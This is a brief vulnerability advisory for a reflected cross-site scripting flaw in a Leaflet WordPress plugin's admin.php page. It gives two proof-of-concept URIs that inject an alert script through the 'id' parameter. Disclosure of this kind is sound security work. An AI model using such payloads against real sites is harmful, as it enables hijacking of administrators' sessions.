Leaflet 'admin.php' Cross Site Scripting Vulnerability

Attackers can exploit this issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/wp-admin/admin.php?page=leaflet_layer&amp;amp;id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E

http://www.example.com/wp-admin/admin.php?page=leaflet_marker&amp;amp;id=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
